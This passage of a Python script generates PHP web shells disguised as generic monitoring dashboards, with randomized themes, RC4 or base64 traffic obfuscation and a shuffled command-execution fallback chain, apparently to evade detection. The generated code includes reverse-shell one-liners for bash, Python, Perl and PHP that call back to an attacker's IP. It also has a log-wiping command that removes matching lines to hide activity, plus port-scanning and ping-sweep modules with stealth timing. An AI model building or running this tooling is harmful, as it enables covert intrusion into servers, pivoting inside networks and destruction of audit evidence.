        "input_fg": "#e8e8f0",
        "form_bg": "#0e0e1e", "form_border": "#1a1a2e",
        "input_bg": "#070710", "input_border": "#1a1a2e", "input_fg2": "#d8d8e8",
        "btn_bg": "#cc0000", "btn_fg": "#ffffff",
        "error_fg": "#ff4444", "note_fg": "#3a3a5a",
        "scroll_track": "#0c0c1a", "scroll_thumb": "#2a2a4a",
    },
    # ── North Korea — stark red on near-black ──
    "korea": {
        "app_name": "Monitoring System", "version_prefix": "v",
        "body_bg": "#080808", "body_fg": "#e8e8e8",
        "shell_bg": "radial-gradient(ellipse at center, #100808 0%, #060606 100%)",
        "shell_border": "#2a0000", "shell_glow": "rgba(255,34,0,0.08)",
        "stream_fg": "#dddddd", "prompt_fg": "#ff2200", "prompt_host_fg": "#4488cc",
        "header_fg": "#ff2200", "header_shadow": "#ff220044",
        "entry_bg": "#0e0808", "entry_border": "rgba(42,0,0,.8)",
        "input_fg": "#e8e8e8",
        "form_bg": "#100808", "form_border": "#2a0000",
        "input_bg": "#060606", "input_border": "#2a0000", "input_fg2": "#dddddd",
        "btn_bg": "#cc0000", "btn_fg": "#ffffff",
        "error_fg": "#ff4444", "note_fg": "#444444",
        "scroll_track": "#0e0808", "scroll_thumb": "#440000",
    },
    # ── French tricolor (bleu/blanc/rouge) ──
    "france": {
        "app_name": "Tableau de Bord", "version_prefix": "v",
        "body_bg": "#05091a", "body_fg": "#dde2f0",
        "shell_bg": "radial-gradient(ellipse at center, #090e24 0%, #030614 100%)",
        "shell_border": "#1a2060", "shell_glow": "rgba(237,41,57,0.08)",
        "stream_fg": "#c8d0e8", "prompt_fg": "#ed2939", "prompt_host_fg": "#4466cc",
        "header_fg": "#ed2939", "header_shadow": "#ed293944",
        "entry_bg": "#080d20", "entry_border": "rgba(26,32,96,.8)",
        "input_fg": "#dde2f0",
        "form_bg": "#090e24", "form_border": "#1a2060",
        "input_bg": "#030614", "input_border": "#1a2060", "input_fg2": "#c8d0e8",
        "btn_bg": "#002395", "btn_fg": "#ffffff",
        "error_fg": "#ed2939", "note_fg": "#353c6a",
        "scroll_track": "#080d20", "scroll_thumb": "#253080",
    },
    # ── American flag palette (navy/red/white) ──
    "usa": {
        "app_name": "Federal Operations", "version_prefix": "v",
        "body_bg": "#05071a", "body_fg": "#e8e0d0",
        "shell_bg": "radial-gradient(ellipse at center, #0a0c22 0%, #030514 100%)",
        "shell_border": "#1c1a4a", "shell_glow": "rgba(178,34,52,0.08)",
        "stream_fg": "#d8d0c0", "prompt_fg": "#b22234", "prompt_host_fg": "#5c5c8e",
        "header_fg": "#b22234", "header_shadow": "#b2223444",
        "entry_bg": "#080a1e", "entry_border": "rgba(28,26,74,.8)",
        "input_fg": "#e8e0d0",
        "form_bg": "#0a0c22", "form_border": "#1c1a4a",
        "input_bg": "#030514", "input_border": "#1c1a4a", "input_fg2": "#d8d0c0",
        "btn_bg": "#3c3b6e", "btn_fg": "#ffffff",
        "error_fg": "#b22234", "note_fg": "#35336a",
        "scroll_track": "#080a1e", "scroll_thumb": "#2a2865",
    },
    # ── Redux DevTools — purple on near-black ──
    "redux": {
        "app_name": "State Inspector", "version_prefix": "v",
        "body_bg": "#1a1b2e", "body_fg": "#cba6f7",
        "shell_bg": "radial-gradient(ellipse at center, #1f1f38 0%, #141424 100%)",
        "shell_border": "#45406a", "shell_glow": "rgba(118,74,188,0.12)",
        "stream_fg": "#b0a0e0", "prompt_fg": "#a97df5", "prompt_host_fg": "#7c6dbd",
        "header_fg": "#a97df5", "header_shadow": "#764abc44",
        "entry_bg": "#1d1e30", "entry_border": "rgba(69,64,106,.8)",
        "input_fg": "#cba6f7",
        "form_bg": "#1f1f38", "form_border": "#45406a",
        "input_bg": "#141424", "input_border": "#45406a", "input_fg2": "#b0a0e0",
        "btn_bg": "#764abc", "btn_fg": "#ffffff",
        "error_fg": "#f48fb1", "note_fg": "#544d7e",
        "scroll_track": "#1d1e30", "scroll_thumb": "#45406a",
    },
}

# app_name/version_prefix pool for --theme poly (generic monitoring look, distinct from named themes)
POLY_APP_NAMES = [
    "System Monitor", "Node Inspector", "Service Dashboard",
    "Cluster Console", "Infra Terminal", "Stack Monitor",
    "Platform Console", "Runtime Inspector", "Deploy Console",
    "Ops Dashboard", "Health Monitor", "Agent Terminal",
    "Mesh Dashboard", "Relay Console", "Core Monitor",
    "Grid Terminal", "Nexus Console", "Vault Monitor",
    "Apex Dashboard", "Pulse Console",
]
POLY_VER_PREFIXES = ["v", "build-", "r", "ver.", "rel-", ""]

# --theme none: bare terminal, no styled header, no color signature
THEME_NONE = {
    "app_name": "", "version_prefix": "",
    "body_bg": "#0c0c0c", "body_fg": "#d4d4d4",
    "shell_bg": "#0c0c0c",
    "shell_border": "#2a2a2a", "shell_glow": "rgba(0,0,0,0)",
    "stream_fg": "#d4d4d4", "prompt_fg": "#ffffff", "prompt_host_fg": "#cccccc",
    "header_fg": "transparent", "header_shadow": "rgba(0,0,0,0)",
    "entry_bg": "#111111", "entry_border": "rgba(255,255,255,0.08)",
    "input_fg": "#d4d4d4",
    "form_bg": "#111111", "form_border": "#2a2a2a",
    "input_bg": "#0c0c0c", "input_border": "#2a2a2a", "input_fg2": "#d4d4d4",
    "btn_bg": "#2a2a2a", "btn_fg": "#d4d4d4",
    "error_fg": "#cc3333", "note_fg": "#666666",
    "scroll_track": "#111111", "scroll_thumb": "#333333",
}

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def generate_poly_theme(rng, app_names=None):
    h   = rng.randint(0, 359)
    ah  = (h + rng.randint(130, 230)) % 360
    bg_s = rng.randint(8, 20)
    bg_l = rng.randint(8, 14)
    fg_s = rng.randint(5, 15)
    fg_l = rng.randint(78, 90)
    acc_s = rng.randint(55, 80)
    acc_l = rng.randint(48, 65)

    def hsl(hh, ss, ll):
        return f"hsl({hh},{max(0, ss)}%,{max(3, ll)}%)"
    def hsla(hh, ss, ll, aa):
        return f"hsla({hh},{max(0, ss)}%,{max(3, ll)}%,{aa:.2f})"

    return {
        "app_name":       rng.choice(app_names or POLY_APP_NAMES),
        "version_prefix": rng.choice(POLY_VER_PREFIXES),
        "body_bg":         hsl(h, bg_s, bg_l),
        "body_fg":         hsl(h, fg_s, fg_l),
        "shell_bg":        f"radial-gradient(ellipse at center, {hsl(h, bg_s+3, bg_l+2)} 0%, {hsl(h, bg_s, bg_l-3)} 100%)",
        "shell_border":    hsl(h, bg_s, bg_l + rng.randint(12, 22)),
        "shell_glow":      hsla(ah, acc_s, acc_l, round(rng.uniform(0.05, 0.14), 2)),
        "stream_fg":       hsl(h, fg_s, fg_l - rng.randint(5, 12)),
        "prompt_fg":       hsl(ah, acc_s, acc_l),
        "prompt_host_fg":  hsl((ah + rng.randint(-20, 20)) % 360,
                               max(30, acc_s - rng.randint(0, 15)),
                               max(35, acc_l + rng.randint(-8, 8))),
        "header_fg":       hsl(ah, acc_s, acc_l),
        "header_shadow":   hsla(ah, acc_s, acc_l, round(rng.uniform(0.20, 0.40), 2)),
        "entry_bg":        hsl(h, bg_s + 2, bg_l + rng.randint(2, 5)),
        "entry_border":    hsla(h, bg_s, bg_l + 20, round(rng.uniform(0.40, 0.80), 2)),
        "input_fg":        hsl(h, fg_s, fg_l),
        "form_bg":         hsl(h, bg_s, bg_l + rng.randint(4, 9)),
        "form_border":     hsl(h, bg_s, bg_l + rng.randint(14, 22)),
        "input_bg":        hsl(h, bg_s, bg_l - 2),
        "input_border":    hsl(h, bg_s, bg_l + rng.randint(14, 22)),
        "input_fg2":       hsl(h, fg_s, fg_l - 5),
        "btn_bg":          hsl(ah, acc_s - rng.randint(0, 15), acc_l - rng.randint(0, 10)),
        "btn_fg":          "#ffffff" if acc_l < 58 else "#000000",
        "error_fg":        hsl(rng.randint(355, 365) % 360, rng.randint(55, 70), rng.randint(55, 65)),
        "note_fg":         hsl(h, bg_s, bg_l + rng.randint(28, 40)),
        "scroll_track":    hsl(h, bg_s, bg_l + rng.randint(3, 7)),
        "scroll_thumb":    hsl(h, bg_s, bg_l + rng.randint(20, 32)),
    }

def rnd_token(rng, length=7):
    return ''.join(rng.choices(string.ascii_lowercase + string.digits, k=length))

def pick(pool, used, rng):
    available = [x for x in pool if x not in used]
    if not available:
        return 'fn_' + rnd_token(rng, 8)
    choice = rng.choice(available)
    used.add(choice)
    return choice

# ─────────────────────────────────────────────────────────────────────────────
# PHP GENERATION
# ─────────────────────────────────────────────────────────────────────────────

def build_php_section(n, jv, ids, route_param, routes, session_key_val,
                      bcrypt_hash, username, junk_before, junk_after,
                      case_order, theme, ver, rng,
                      transport, transport_ctx, features, no_auth=False,
                      poly_app_names=None):
    if theme == 'poly':
        T = generate_poly_theme(rng, app_names=poly_app_names)
    elif theme == 'none':
        T = THEME_NONE
    else:
        T = CSS_THEMES[theme]
    cfg = n['cfg_var']

    # ── Transport setup ──
    p_cmd      = transport_ctx['p_cmd']
    p_cwd      = transport_ctx['p_cwd']
    p_filename = transport_ctx['p_filename']
    p_filetype = transport_ctx['p_filetype']
    p_path     = transport_ctx['p_path']
    p_file     = transport_ctx['p_file']
    p_ip       = transport_ctx['p_ip']
    p_port_rs  = transport_ctx['p_port_rs']
    p_logfile  = transport_ctx['p_logfile']
    p_pattern  = transport_ctx['p_pattern']
    p_target   = transport_ctx['p_target']
    p_ports_ps = transport_ctx['p_ports_ps']
    p_mode      = transport_ctx['p_mode']
    p_timeout   = transport_ctx['p_timeout']
    p_pause     = transport_ctx['p_pause']
    p_rs_method = transport_ctx['p_rs_method']
    p_ps_probe  = transport_ctx['p_ps_probe']

    # ── Feature-gated JS interceptors ──
    jfn = jv  # alias used throughout f-string template
    _js_interceptors = []
    if features.get('revshell'):
        _js_interceptors.append(
            f"            var _rsRaw = command.match(/^\\s*revshell\\s+(\\S+)\\s+(\\d+)(.*)?$/i);\n"
            f"            if (_rsRaw) {{\n"
            f"                var _rsMethod = '';\n"
            f"                var _rsMethodM = (_rsRaw[3] || '').match(/--method\\s+(\\S+)/i);\n"
            f"                if (_rsMethodM) _rsMethod = _rsMethodM[1];\n"
            f"                {jfn['pipe_call']}(\"?{route_param}={routes['revshell']}\", {{{p_ip}: _rsRaw[1], {p_port_rs}: _rsRaw[2], {p_rs_method}: _rsMethod}}, function(r) {{\n"
            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
            f"                }});\n"
            f"                return;\n"
            f"            }}"
        )
    if features.get('clearlog'):
        _js_interceptors.append(
            f"            var _clm = command.match(/^\\s*clearlog\\s+(\\S+)\\s+(.+?)\\s*$/i);\n"
            f"            if (_clm) {{\n"
            f"                {jfn['pipe_call']}(\"?{route_param}={routes['clearlog']}\", {{{p_logfile}: _clm[1], {p_pattern}: _clm[2]}}, function(r) {{\n"
            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
            f"                }});\n"
            f"                return;\n"
            f"            }}"
        )
    if features.get('portscan'):
        _js_interceptors.append(
            f"            var _psmRaw = command.match(/^\\s*portscan\\s+(\\S+)\\s+(\\S+)(.*)?$/i);\n"
            f"            if (_psmRaw) {{\n"
            f"                var _psMode = 'default', _psTout = '', _psPause = '';\n"
            f"                var _psRest = _psmRaw[3] || '';\n"
            f"                if (/--stealth/i.test(_psRest)) _psMode = 'stealth';\n"
            f"                else if (/--fast/i.test(_psRest)) _psMode = 'fast';\n"
            f"                var _psTM = _psRest.match(/--timeout\\s+(\\S+)/i);\n"
            f"                if (_psTM) _psTout = _psTM[1];\n"
            f"                var _psPM = _psRest.match(/--pause\\s+(\\S+)/i);\n"
            f"                if (_psPM) _psPause = _psPM[1];\n"
            f"                {jfn['insert_stdout']}(\"Scanning...\");\n"
            f"                {jfn['pipe_call']}(\"?{route_param}={routes['portscan']}\", {{{p_target}: _psmRaw[1], {p_ports_ps}: _psmRaw[2], {p_mode}: _psMode, {p_timeout}: _psTout, {p_pause}: _psPause}}, function(r) {{\n"
            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
            f"                }});\n"
            f"                return;\n"
            f"            }}"
        )
    if features.get('pingsweep'):
        _js_interceptors.append(
            f"            var _pgmRaw = command.match(/^\\s*pingsweep\\s+(\\S+)(.*)?$/i);\n"
            f"            if (_pgmRaw) {{\n"
            f"                var _pgMode = 'default', _pgTout = '', _pgPause = '', _pgProbe = '';\n"
            f"                var _pgRest = _pgmRaw[2] || '';\n"
            f"                if (/--stealth/i.test(_pgRest)) _pgMode = 'stealth';\n"
            f"                else if (/--fast/i.test(_pgRest)) _pgMode = 'fast';\n"
            f"                var _pgTM = _pgRest.match(/--timeout\\s+(\\S+)/i);\n"
            f"                if (_pgTM) _pgTout = _pgTM[1];\n"
            f"                var _pgPM = _pgRest.match(/--pause\\s+(\\S+)/i);\n"
            f"                if (_pgPM) _pgPause = _pgPM[1];\n"
            f"                var _pgPrM = _pgRest.match(/--ports\\s+(\\S+)/i);\n"
            f"                if (_pgPrM) _pgProbe = _pgPrM[1];\n"
            f"                {jfn['insert_stdout']}(\"Sweeping...\");\n"
            f"                {jfn['pipe_call']}(\"?{route_param}={routes['pingsweep']}\", {{{p_target}: _pgmRaw[1], {p_ps_probe}: _pgProbe, {p_mode}: _pgMode, {p_timeout}: _pgTout, {p_pause}: _pgPause}}, function(r) {{\n"
            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
            f"                }});\n"
            f"                return;\n"
            f"            }}"
        )
    js_feature_interceptors = ("\n" + "\n".join(_js_interceptors)) if _js_interceptors else ""

    if transport == 'plain':
        def pdec(param, fallback=None):
            s = f"$_POST['{param}']"
            return s + (' ?? ' + (fallback or "''"))
        php_transport_inject = ''
        php_ct   = 'application/json'
        php_echo = 'echo json_encode($response);'
        js_transport_inject  = ''
        js_enc = 'String(v)'
        js_dec = 'JSON.parse(r)'

    elif transport == 'mimic':
        def pdec(param, fallback=None):
            s = f"base64_decode($_POST['{param}'] ?? '')"
            return s + (' ?: ' + fallback if fallback else '')
        php_transport_inject = ''
        php_ct   = 'text/plain'
        php_echo = 'echo base64_encode(json_encode($response));'
        js_transport_inject  = ''
        js_enc = 'btoa(unescape(encodeURIComponent(String(v))))'
        js_dec = 'JSON.parse(decodeURIComponent(escape(atob(r))))'

    else:  # rc4
        rc4_key_hex   = transport_ctx['rc4_key_hex']
        rc4_key_bytes = transport_ctx['rc4_key_bytes']
        b64_alpha     = transport_ctx['b64_alpha']
        rc4_bytes_js  = ','.join(str(b) for b in rc4_key_bytes)
        php_transport_inject = (
            f"define('__TK', hex2bin('{rc4_key_hex}'));\n"
            f"define('__TA', '{b64_alpha}');\n"
            "define('__TS', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/');\n"
            "function __trc4(string $d): string {\n"
            "    $k=__TK; $s=range(0,255); $j=0;\n"
            "    for($i=0;$i<256;$i++){$j=($j+$s[$i]+ord($k[$i%strlen($k)]))%256;[$s[$i],$s[$j]]=[$s[$j],$s[$i]];}\n"
            "    $i=$j=0; $o='';\n"
            "    for($n=0;$n<strlen($d);$n++){$i=($i+1)%256;$j=($j+$s[$i])%256;[$s[$i],$s[$j]]=[$s[$j],$s[$i]];$o.=chr(ord($d[$n])^$s[($s[$i]+$s[$j])%256]);}\n"
            "    return $o;\n"
            "}\n"
            "function tEnc(string $d): string { return strtr(base64_encode(__trc4($d)), __TS, __TA); }\n"
            "function tDec(string $d): string { return __trc4(base64_decode(strtr($d, __TA, __TS))); }\n"
        )
        def pdec(param, fallback=None):
            s = f"tDec($_POST['{param}'] ?? '')"
            return s + (' ?: ' + fallback if fallback else '')
        php_ct   = 'text/plain'
        php_echo = 'echo tEnc(json_encode($response));'
        js_transport_inject = (
            f"        var __TK=[{rc4_bytes_js}];\n"
            f"        var __TS='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';\n"
            f"        var __TA='{b64_alpha}';\n"
            "        function __trc4(k,b){\n"
            "            var s=[],i,j=0,t;\n"
            "            for(i=0;i<256;i++)s[i]=i;\n"
            "            for(i=0;i<256;i++){j=(j+s[i]+k[i%k.length])&255;t=s[i];s[i]=s[j];s[j]=t;}\n"
            "            i=0;j=0;\n"
            "            return b.map(function(x){i=(i+1)&255;j=(j+s[i])&255;t=s[i];s[i]=s[j];s[j]=t;return x^s[(s[i]+s[j])&255];});\n"
            "        }\n"
            "        function tEnc(s){\n"
            "            var b=__trc4(__TK,[].map.call(s,function(c){return c.charCodeAt(0)}));\n"
            "            var r=btoa(b.reduce(function(a,x){return a+String.fromCharCode(x)},''));\n"
            "            return r.split('').map(function(c){return c==='='?'=':__TA[__TS.indexOf(c)]}).join('');\n"
            "        }\n"
            "        function tDec(s){\n"
            "            var b64=s.split('').map(function(c){return c==='='?'=':__TS[__TA.indexOf(c)]}).join('');\n"
            "            var raw=[].map.call(atob(b64),function(c){return c.charCodeAt(0)});\n"
            "            return __trc4(__TK,raw).reduce(function(a,x){return a+String.fromCharCode(x)},'');\n"
            "        }\n"
        )
        js_enc = 'tEnc(String(v))'
        js_dec = 'JSON.parse(tDec(r))'

    # exec fallback chain — weighted order + random drop of optional methods per build
    _fb_defs = [
        # (condition, body, weight, optional)
        # weight: higher = more likely to appear first in the shuffled chain
        # optional: may be dropped from this build entirely (~30% chance each)
        ("function_exists('exec')",
         "        exec($cmd, $_out);\n        $output = implode(\"\\n\", $_out);",
         5, False),
        ("function_exists('shell_exec')",
         "        $output = (string) shell_exec($cmd);",
         4, False),
        (f"{n['check_funcs']}(['system','ob_start','ob_get_contents','ob_end_clean'])",
         "        ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean();",
         3, False),
        (f"{n['check_funcs']}(['passthru','ob_start','ob_get_contents','ob_end_clean'])",
         "        ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean();",
         2, True),
        (f"{n['check_funcs']}(['popen','feof','fread','pclose'])",
         "        $h = popen($cmd, 'r');\n        if (is_resource($h)) { while (!feof($h)) { $output .= fread($h, 4096); } pclose($h); }",
         2, True),
        ("function_exists('proc_open')",
         "        $desc=[1=>['pipe','w'],2=>['pipe','w']];\n"
         "        $pr=proc_open($cmd,$desc,$pipes);\n"
         "        if(is_resource($pr)){$output=stream_get_contents($pipes[1]);fclose($pipes[1]);proc_close($pr);}",
         2, True),
    ]
    # Drop each optional method with ~30% probability
    _active = [i for i, (_, __, _w, opt) in enumerate(_fb_defs)
               if not opt or rng.random() > 0.30]
    # Guarantee at least one optional method survives (avoid predictable 3-method builds)
    if all(not _fb_defs[i][3] for i in _active):
        _active.append(rng.choice([i for i, (_, __, _w, opt) in enumerate(_fb_defs) if opt]))
    # Weighted shuffle: draw methods one by one, probability proportional to weight
    _ordered, _pool = [], list(_active)
    while _pool:
        _w = [_fb_defs[i][2] for i in _pool]
        _pick = rng.choices(_pool, weights=_w, k=1)[0]
        _ordered.append(_pick)
        _pool.remove(_pick)
    fallback_block = "\n".join(
        "    {} ({}) {{\n{}\n    }}".format("if" if i == 0 else "elseif", _fb_defs[m][0], _fb_defs[m][1])
        for i, m in enumerate(_ordered)
    )

    # ── Pre-computed pdec expressions for optional params ──
    _pdec_mode      = pdec(p_mode, "'default'")
    _pdec_timeout   = pdec(p_timeout, "''")
    _pdec_pause     = pdec(p_pause, "''")
    _pdec_rs_method = pdec(p_rs_method, "''")
    _pdec_ps_probe  = pdec(p_ps_probe, "''")

    # ── Switch cases ──
    case_blocks = {
        'shell': (
            f"        case '{routes['shell']}':\n"
            f"            $cmd = {pdec(p_cmd)};\n"
            f"            $cwd = {pdec(p_cwd, 'getcwd()')};\n"
            f"            if (!preg_match('/2>/', $cmd)) {{ $cmd .= ' 2>&1'; }}\n"
            f"            $response = {n['resolve_task']}($cmd, $cwd);\n"
            f"            break;"
        ),
        'pwd': (
            f"        case '{routes['pwd']}':\n"
            f"            $response = {n['get_cwd']}();\n"
            f"            break;"
        ),
        'hint': (
            f"        case '{routes['hint']}':\n"
            f"            $response = {n['tab_complete']}(\n"
            f"                {pdec(p_filename)},\n"
            f"                {pdec(p_cwd, 'getcwd()')},\n"
            f"                {pdec(p_filetype)} ?: 'file'\n"
            f"            );\n"
            f"            break;"
        ),
        'upload': (
            f"        case '{routes['upload']}':\n"
            f"            $path = {pdec(p_path)};\n"
            f"            $file = {pdec(p_file)};\n"
            f"            $cwd  = {pdec(p_cwd, 'getcwd()')};\n"
            f"            $response = ($path && $file)\n"
            f"                ? {n['write_file']}($path, $file, $cwd)\n"
            f"                : ['stdout' => base64_encode('Missing parameters.'), 'cwd' => base64_encode(getcwd())];\n"
            f"            break;"
        ),
        'revshell': "\n".join([
            f"        case '{routes['revshell']}':",
            f"            $__ip   = {pdec(p_ip)};",
            f"            $__port = (int)({pdec(p_port_rs)});",
            "            if (!filter_var($__ip, FILTER_VALIDATE_IP) || $__port < 1 || $__port > 65535) {",
            "                $response = ['stdout' => base64_encode('Usage: revshell <IP> <PORT> [--method bash|python3|perl|php]'), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            $__sent = null;",
            "            $__cmds = [",
            "                'bash'    => 'bash -c \\'bash -i >& /dev/tcp/' . $__ip . '/' . $__port . ' 0>&1\\'',",
            "                'python3' => 'python3 -c \"import socket,os,pty,subprocess;s=socket.socket();s.connect((\\\"\" . $__ip . \"\\\",\" . $__port . \"));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\\\"/bin/sh\\\"])\"',",
            "                'perl'    => 'perl -MSocket -e \\'$i=\"' . $__ip . '\";$p=' . $__port . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\");\\'',",
            "                'php'     => 'php -r \\'$s=fsockopen(\"' . $__ip . '\",$__port);$p=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$x);\\'',",
            "            ];",
            f"            $__force = trim({_pdec_rs_method});",
            "            if ($__force && isset($__cmds[$__force])) {",
            "                $__cmds = [$__force => $__cmds[$__force]];",
            "            }",
            "            foreach ($__cmds as $__bin => $__cmd) {",
            "                if (@shell_exec('which ' . escapeshellarg($__bin) . ' 2>/dev/null')) {",
            "                    if (function_exists('proc_open')) {",
            "                        $__d = []; proc_close(proc_open($__cmd . ' >/dev/null 2>&1 &', $__d, $__px));",
            "                    } else { exec($__cmd . ' >/dev/null 2>&1 &'); }",
            "                    $__sent = $__bin; break;",
            "                }",
            "            }",
            "            $__out = $__sent",
            "                ? 'Reverse shell sent via ' . $__sent . ' to ' . $__ip . ':' . $__port . \"\\nListener: nc -lvnp \" . $__port",
            "                : ($__force ? \"Method '$__force' not available on this host.\" : 'No suitable binary found (tried bash, python3, perl, php).');",
            "            $response = ['stdout' => base64_encode($__out), 'cwd' => base64_encode(getcwd())];",
            "            break;",
        ]),
        'clearlog': "\n".join([
            f"        case '{routes['clearlog']}':",
            f"            $__lf = {pdec(p_logfile)};",
            f"            $__pt = {pdec(p_pattern)};",
            "            if (!$__lf || !$__pt) {",
            "                $response = ['stdout' => base64_encode('Usage: clearlog <file> <pattern>'), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            if (!is_readable($__lf) || !is_writable($__lf)) {",
            "                $response = ['stdout' => base64_encode(\"Error: {$__lf} not readable/writable\"), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            $__lines  = file($__lf, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);",
            "            $__before = count($__lines);",
            "            $__re     = '/' . str_replace('/', '\\\\/', $__pt) . '/i';",
            "            $__filt   = array_values(array_filter($__lines, function($__l) use ($__re) { return !preg_match($__re, $__l); }));",
            "            file_put_contents($__lf, $__filt ? implode(\"\\n\", $__filt) . \"\\n\" : '');",
            "            $__rm = $__before - count($__filt);",
            "            $response = ['stdout' => base64_encode(\"Removed {$__rm}/{$__before} lines matching '{$__pt}' from {$__lf}\"), 'cwd' => base64_encode(getcwd())];",
            "            break;",
        ]),
        'portscan': "\n".join([
            f"        case '{routes['portscan']}':",
            f"            $__tg      = trim({pdec(p_target)});",
            f"            $__ps      = trim({pdec(p_ports_ps)});",
            f"            $__mode    = trim({_pdec_mode});",
            f"            $__tout_r  = trim({_pdec_timeout});",
            f"            $__pause_r = trim({_pdec_pause});",
            "            if (!$__tg || !$__ps) {",
            "                $response = ['stdout' => base64_encode('Usage: portscan <target[,target|cidr|range]> <port[s]|minimal|web|top20|top100> [--stealth|--fast] [--timeout N] [--pause N]'), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            $__presets = [",
            "                'fast'    => ['t' => 0.1, 'p' => 0],",
            "                'default' => ['t' => 0.3, 'p' => 0],",
            "                'stealth' => ['t' => 2.0, 'p' => 500],",
            "            ];",
            "            $__pr = $__presets[in_array($__mode, ['fast','stealth']) ? $__mode : 'default'];",
            "            $__timeout  = ($__tout_r  !== '') ? max(0.05, (float)$__tout_r)  : $__pr['t'];",
            "            $__pause_ms = ($__pause_r !== '') ? max(0,    (int)$__pause_r)   : $__pr['p'];",
            "            // --- IP parsing ---",
            "            $__ips = [];",
            "            foreach (array_filter(array_map('trim', explode(',', $__tg))) as $__tg_part) {",
            "                if ($__tg_part === '') continue;",
            "                if (strpos($__tg_part, '/') !== false) {",
            "                    [$__cip, $__cbits] = explode('/', $__tg_part, 2);",
            "                    $__cbits = min(max((int)$__cbits, 16), 32);",
            "                    $__cbase = ip2long($__cip);",
            "                    if ($__cbase !== false) {",
            "                        $__ccount = 1 << (32 - $__cbits);",
            "                        $__cstart = ($__cbase & ~($__ccount - 1)) + 1;",
            "                        for ($__ci = 0; $__ci < $__ccount - 2 && count($__ips) < 1024; $__ci++) {",
            "                            $__ips[] = long2ip($__cstart + $__ci);",
            "                        }",
            "                    }",
            "                } elseif (strpos($__tg_part, '-') !== false) {",
            "                    [$__r1, $__r2] = explode('-', $__tg_part, 2);",
            "                    $__r1 = trim($__r1); $__r2 = trim($__r2);",
            "                    if (strpos($__r2, '.') !== false) {",
            "                        $__rs = ip2long($__r1); $__re = ip2long($__r2);",
            "                        if ($__rs !== false && $__re !== false && $__re >= $__rs) {",
            "                            for ($__ri = $__rs; $__ri <= $__re && count($__ips) < 1024; $__ri++) $__ips[] = long2ip($__ri);",
            "                        }",
            "                    } elseif (preg_match('/^(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.)(\\\\d{1,3})$/', $__r1, $__rm2)) {",
            "                        for ($__i = (int)$__rm2[2]; $__i <= min((int)$__r2, 254) && count($__ips) < 1024; $__i++) $__ips[] = $__rm2[1].$__i;",
            "                    }",
            "                } else {",
            "                    $__ips[] = $__tg_part;",
            "                }",
            "            }",
            "            $__ips = array_values(array_unique($__ips));",
            "            if (!$__ips) {",
            "                $response = ['stdout' => base64_encode('No valid targets parsed from: ' . $__tg), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            // --- Port parsing with named presets ---",
            "            $__port_presets = [",
            "                'minimal' => [22, 80, 443],",
            "                'web'     => [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 4848, 9200],",
            "                'top20'   => [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080],",
            "                'top100'  => [7,9,13,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,119,135,139,143,144,179,199,389,427,443,444,445,465,513,514,515,543,544,548,554,587,631,646,873,990,993,995,1110,1433,1720,1723,1755,1900,2000,2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000,6001,6646,7070,8000,8008,8009,8080,8081,8443,8888,9100,9999,10000,32768,49152,49153,49154,49155,49156,49157],",
            "            ];",
            "            $__ports = [];",
            "            if (isset($__port_presets[$__ps])) {",
            "                $__ports = $__port_presets[$__ps];",
            "            } else {",
            "                foreach (explode(',', $__ps) as $__chunk) {",
            "                    $__chunk = trim($__chunk);",
            "                    if ($__chunk === '') continue;",
            "                    if (strpos($__chunk, '-') !== false) {",
            "                        [$__s2, $__e2] = explode('-', $__chunk, 2);",
            "                        for ($__p2 = (int)$__s2; $__p2 <= min((int)$__e2, 65535) && count($__ports) < 1000; $__p2++) $__ports[] = $__p2;",
            "                    } else { $__ports[] = (int)$__chunk; }",
            "                }",
            "                $__ports = array_values(array_unique(array_filter($__ports, fn($__p2) => $__p2 > 0 && $__p2 <= 65535)));",
            "            }",
            "            sort($__ports);",
            "            if (!$__ports) {",
            "                $response = ['stdout' => base64_encode('No valid ports parsed. Use numbers, ranges (22-100), or presets: minimal web top20 top100'), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            if (count($__ips) * count($__ports) > 2000) {",
            "                $response = ['stdout' => base64_encode('Scan too large (max 2000 host:port pairs). Use --fast for wider scans or reduce range.'), 'cwd' => base64_encode(getcwd())];",
            "                break;",
            "            }",
            "            set_time_limit(0);",
            "            ignore_user_abort(true);",
            "            $__open = []; $__chk = 0;",
            "            foreach ($__ips as $__ip) {",
            "                foreach ($__ports as $__port) {",
            "                    $__sock = @fsockopen($__ip, $__port, $__en, $__es, $__timeout);",
            "                    if ($__sock) { $__open[] = \"$__ip:$__port\"; fclose($__sock); }",
            "                    $__chk++;",
            "                    if ($__pause_ms > 0) usleep($__pause_ms * 1000);",
            "                }",
            "            }",
            "            $__mode_str = ($__tout_r !== '' || $__pause_r !== '') ? \"custom(t={$__timeout}s,p={$__pause_ms}ms)\" : $__mode;",
